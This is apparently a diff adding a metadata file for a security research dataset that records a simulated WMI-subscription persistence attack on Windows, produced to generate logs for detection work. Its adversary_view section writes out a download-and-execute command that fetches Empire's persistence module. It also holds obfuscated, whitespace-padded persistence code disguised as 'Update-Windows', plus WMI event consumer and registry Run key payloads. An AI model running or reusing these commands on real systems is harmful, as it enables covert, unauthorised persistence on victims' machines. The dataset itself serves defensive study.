@@ -1,0 +1,80 @@
+id: 190518-WMISubscriptionCreation-Elevated
+title: Elevated WMI Subscription Created
+description: This dataset represents adversaries leveraging WMI subscriptions locally for persistence.
+references:
+
+collaborators:
+  - Roberto Rodriguez @Cyb3rWard0g
+creation_date: 2019/05/18
+modification_date: 2020/09/20
+platform:
+  - Windows
+type: atomic
+tags:
+  - Local WMI Eventing
+  - WMI Event Subscriptions
+
+attack_mappings:
+  - technique: T1546
+    sub-technique: "003"
+    tactics:
+      - TA0003
+      - TA0004
+
+datasets:
+  endpoint:
+    - log_source: Microsoft-Windows-Sysmon
+      size: 422.04 kB
+      link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/190518-WMISubscriptionCreation-Elevated/WORKSTATION6_Windows_MicrosoftWindowsSysmonOperational.zip
+    - log_source: Microsoft-Windows-WMI-Activity/Operational
+      size: 2.79 kB
+      link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/190518-WMISubscriptionCreation-Elevated/WORKSTATION6_Windows_MicrosoftWindowsWMIActivityOperational.zip
+
+simulation:
+  environment: Blacksmith
+  tools:
+    - type: Manual
+      name: PowerShell
+      module: PowerShell
+      script: https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/persistence/Persistence.psm1
+  permissions_required:
+    - Administrator
+  adversary_view: |-
+    Adversary Box
+    -------------
+    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/persistence/Persistence.psm1')
+    
+    $InvokeWhoami= { Invoke-Expression whoami }
+    $ElevatedOptions = New-ElevatedPersistenceOption -PermanentWMI -AtStartup
+    $UserOptions = New-UserPersistenceOption -Registry -AtLogon
+    Add-Persistence -ScriptBlock $InvokeWhoami -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $UserOptions -Verbose
+
+    Victim Box
+    ----------
+    Open a non-elevated PowerShell session
+    Run the contents of the script (Persistence.ps1) created in the previous steps
+
+    FILE:
+    -----
+    function Update-Windows{
+    Param([Switch]$Persist)
+    $ErrorActionPreference='SilentlyContinue'
+    $Script={sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('U/DMK8vPTtV1rSgoSi0uzszPUyjPyE/MzVQAAA=='),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()}
+    if($Persist){
+    if(([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator'))
+    {$Prof=$PROFILE.AllUsersAllHosts;$Payload="`$Filter=Set-WmiInstance -Class __EventFilter -Namespace `"root\subscription`" -Arguments @{name='Updater';EventNameSpace='root\CimV2';QueryLanguage=`"WQL`";Query=`"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325`"};`$Consumer=Set-WmiInstance -Namespace `"root\subscription`" -Class 'CommandLineEventConsumer' -Arguments @{ name='Updater';CommandLineTemplate=`"`$(`$Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -NonInteractive`";RunInteractively='false'};Set-WmiInstance -Namespace `"root\subscription`" -Class __FilterToConsumerBinding -Arguments @{Filter=`$Filter;Consumer=`$Consumer} | Out-Null"}
+    else
+    {$Prof=$PROFILE.CurrentUserAllHosts;$Payload='New-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Updater -PropertyType String -Value "`"$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe`" -NonInteractive -WindowStyle Hidden"'}
+    if(!(Test-Path $Prof)){New-Item -Path $Prof -Type File -Force}
+    ' '*600+$Script.ToString()|Out-File $Prof -A -NoC -Fo
+    iex $Payload|Out-Null
+    Write-Output $Payload}
+    else
+    {$Script.Invoke()}
+    } Update-Windows -Persist
+
+    Run
+    ---
+    PS C:\Windows\system32>.\Persistence.ps1
+    PS C:\Windows\system32>
+references:
